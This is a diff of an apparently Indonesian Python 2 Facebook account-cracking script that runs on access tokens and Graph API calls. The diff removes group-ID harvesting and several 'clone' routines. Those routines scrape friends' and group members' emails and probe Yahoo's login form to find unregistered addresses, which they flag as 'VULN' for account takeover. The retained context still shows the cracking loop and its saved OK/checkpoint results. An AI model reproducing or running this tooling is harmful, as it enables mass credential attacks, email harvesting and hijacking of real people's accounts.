@@ -205,10 +205,6 @@ def pilih():
 		pilih()
 	elif unikers =="1":
 		super()
-	elif unikers =="42782747288465":
-		grupsaya()
-	elif unikers =="64728485838837":
-		yahoo()
 	elif unikers =="0":
 		jalan('Token Removed')
 		os.system('rm -rf login.txt')
@@ -269,34 +265,16 @@ def pilih_super():
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
-	elif peak =="4757828477347":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		idg=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
-		try:
-			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
-			asw=json.loads(r.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName group \033[1;91m:\033[1;97m "+asw['name']
-		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
-			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-			super()
-		jalan('\033[1;96m[✺] \033[1;93mGetting IDs \033[1;97m...')
-		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
-		s=json.loads(re.text)
-		for p in s['data']:
-			id.append(p['id'])
 	elif peak =="3":
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
 		try:
-			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  \x1b[1;91m: \x1b[1;97m')
+			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
 			for line in open(idlist,'r').readlines():
 				id.append(line.strip())
 		except IOError:
-			print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
+			print '\x1b[1;96m[!] \x1b[1;91mFile Not Found'
 			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
 			super()
 	elif peak =="0":
@@ -306,12 +284,12 @@ def pilih_super():
 		pilih_super()
 	
 	print "\033[1;96m[+] \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
-	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
+	jalan('\033[1;96m[✺] \033[1;93mStarting \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
 	print 42*"\033[1;96m="
 	
 			
@@ -436,365 +414,7 @@ def pilih_super():
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-	super()
-
-
-def grupsaya():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mToken tidak ditemukan"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		os.mkdir('out')
-	except OSError:
-		pass
-	os.system('clear')
-	print logo
-	print 42*"\033[1;96m="
-	try:
-		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
-		gud = json.loads(uh.text)
-		for p in gud['data']:
-			nama = p["name"]
-			id = p["id"]
-			f=open('out/Grupid.txt','w')
-			listgrup.append(id)
-			f.write(id + '\n')
-			print "\033[1;96m[\033[1;92mGroup\033[1;96m]\x1b[1;97m "+str(id)+" \x1b[1;96m=>\x1b[1;97m "+str(nama)
-		print 42*"\033[1;96m="
-		print"\033[1;96m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
-		print("\033[1;96m[+] \033[1;92mTersimpan \033[1;91m: \033[1;97mout/Grupid.txt")
-		f.close()
-		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-		menu()
-	except (KeyboardInterrupt,EOFError):
-		print("\033[1;96m[!] \x1b[1;91mTerhenti")
-		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-		menu()
-	except KeyError:
-		os.remove('out/Grupid.txt')
-		print('\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan')
-		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-		menu()
-	except requests.exceptions.ConnectionError:
-		print"\033[1;96m[✖] \x1b[1;91mThere is no internet connection"
-		keluar()
-	except IOError:
-		print "\033[1;96m[!] \x1b[1;91mError"
-		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-		menu()
-
-
-def yahoo():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;91m[!] Token not found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	os.system('clear')
-	print logo
-	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Clone dari daftar "
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Clone dari teman"
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Clone dari member group"
-	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Clone dari file"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
-	clone()
-       
-def clone():
-	embuh = raw_input("\n\x1b[1;97m >>> ")
-	if embuh =="":
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
-	elif embuh =="1":
-		clone_dari_daftar_teman()
-	elif embuh =="2":
-		clone_dari_teman()
-	elif embuh =="3":
-		clone_dari_member_group()
-	elif embuh =="4":
-		clone_dari_file()
-	elif embuh =="0":
-		menu()
-	else:
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
-		
-
-def clone_dari_daftar_teman():
-	global toket
-	os.system('reset')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;91m[!] Token Invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		os.mkdir('out')
-	except OSError:
-		pass
-	os.system('clear')
-	print logo
-	mpsh = []
-	jml = 0
-	print 42*"\033[1;96m="
-	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mMengambil email \033[1;97m...')
-	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
-	kimak = json.loads(teman.text)
-	save = open('out/MailVuln.txt','w')
-	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mStart \033[1;97m...')
-	print ('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-	print 42*"\033[1;96m="
-	for w in kimak['data']:
-		jml +=1
-		mpsh.append(jml)
-		id = w['id']
-		nama = w['name']
-		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
-		z = json.loads(links.text)
-		try:
-			mail = z['email']
-			yahoo = re.compile(r'@.*')
-			otw = yahoo.search(mail).group()
-			if 'yahoo.com' in otw:
-				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
-				br._factory.is_html = True
-				br.select_form(nr=0)
-				br["username"] = mail
-				klik = br.submit().read()
-				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
-				try:
-					pek = jok.search(klik).group()
-				except:
-					continue
-				if '"messages.ERROR_INVALID_USERNAME">' in pek:
-					save.write("Name: "+ nama +"ID :" + id +"Email: "+ mail + '\n')
-					print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+nama)
-					berhasil.append(mail)
-		except KeyError:
-			pass
-	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
-	print"\033[1;96m[+] \033[1;92mFile Has Been Saved \033[1;91m:\033[1;97m out/MailVuln.txt"
-	save.close()
-	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 
-
-def clone_dari_teman():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		os.mkdir('out')
-	except OSError:
-		pass
-	os.system('clear')
-	print logo
-	mpsh = []
-	jml = 0
-	print 42*"\033[1;96m="
-	idt = raw_input("\033[1;96m[+] \033[1;93mEnter Friend's ID \033[1;91m: \033[1;97m")
-	try:
-		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-		op = json.loads(jok.text)
-		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
-	except KeyError:
-		print"\033[1;96m[!] \x1b[1;91mFriend Not Found"
-		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-		menu()
-	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
-	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
-	kimak = json.loads(teman.text)
-	save = open('out/TemanMailVuln.txt','w')
-	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-	print 43*"\033[1;96m="
-	for w in kimak['data']:
-		jml +=1
-		mpsh.append(jml)
-		id = w['id']
-		nama = w['name']
-		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
-		z = json.loads(links.text)
-		try:
-			mail = z['email']
-			yahoo = re.compile(r'@.*')
-			otw = yahoo.search(mail).group()
-			if 'yahoo.com' in otw:
-				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
-				br._factory.is_html = True
-				br.select_form(nr=0)
-				br["username"] = mail
-				klik = br.submit().read()
-				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
-				try:
-					pek = jok.search(klik).group()
-				except:
-					continue
-				if '"messages.ERROR_INVALID_USERNAME">' in pek:
-					save.write("Name: "+ nama +"ID :" + id +"Email: "+ mail + '\n')
-					print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+nama)
-					berhasil.append(mail)
-		except KeyError:
-			pass
-	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
-	print"\033[1;96m[+] \033[1;92mFile Has Been Saved \033[1;91m:\033[1;97m out/TemanMailVuln.txt"
-	save.close()
-	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-	menu()
-	
-def clone_dari_member_group():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		os.mkdir('out')
-	except OSError:
-		pass
-	os.system('clear')
-	print logo
-	mpsh = []
-	jml = 0
-	print 42*"\033[1;96m="
-	id=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
-	try:
-		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
-		asw=json.loads(r.text)
-		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName group \033[1;91m:\033[1;97m "+asw['name']
-	except KeyError:
-		print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
-		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-		menu()
-	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
-	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
-	kimak = json.loads(teman.text)
-	save = open('out/GrupMailVuln.txt','w')
-	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-	print 42*"\033[1;96m="
-	for w in kimak['data']:
-		jml +=1
-		mpsh.append(jml)
-		id = w['id']
-		nama = w['name']
-		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
-		z = json.loads(links.text)
-		try:
-			mail = z['email']
-			yahoo = re.compile(r'@.*')
-			otw = yahoo.search(mail).group()
-			if 'yahoo.com' in otw:
-				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
-				br._factory.is_html = True
-				br.select_form(nr=0)
-				br["username"] = mail
-				klik = br.submit().read()
-				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
-				try:
-					pek = jok.search(klik).group()
-				except:
-					continue
-				if '"messages.ERROR_INVALID_USERNAME">' in pek:
-					save.write("Name: "+ nama +"ID :" + id +"Email: "+ mail + '\n')
-					print("\033[1;96m[\033[1;97mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+nama)
-					berhasil.append(mail)
-		except KeyError:
-			pass
-	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
-	print"\033[1;96m[+] \033[1;92mFile Has Been Saved \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
-	save.close()
-	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-	menu()
-
-
-def clone_dari_file():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		os.mkdir('out')
-	except OSError:
-		pass
-	os.system('clear')
-	print logo
-	print 42*"\033[1;96m="
-	files = raw_input("\033[1;96m[+] \033[1;93mName File \033[1;91m: \033[1;97m")
-	try:
-		total = open(files,"r")
-		mail = total.readlines()
-	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mFile tidak ditemukan"
-		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-		menu()
-	mpsh = []
-	jml = 0
-	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-	save = open('out/FileMailVuln.txt','w')
-	print 42*"\033[1;96m="
-	mail = open(files,"r").readlines()
-	for pw in mail:
-		mail = pw.replace("\n","")
-		jml +=1
-		mpsh.append(jml)
-		yahoo = re.compile(r'@.*')
-		otw = yahoo.search(mail).group()
-		if 'yahoo.com' in otw:
-			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
-			br._factory.is_html = True
-			br.select_form(nr=0)
-			br["username"] = mail
-			klik = br.submit().read()
-			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
-			try:
-				pek = jok.search(klik).group()
-			except:
-				continue
-			if '"messages.ERROR_INVALID_USERNAME">' in pek:
-				save.write(mail + '\n')
-				print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail)
-				berhasil.append(mail)
-	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
-	print"\033[1;96m[+] \033[1;92mFile Tersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
-	save.close()
-	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-	menu()
-	
-       
-		
 if __name__ == '__main__':
 	login()
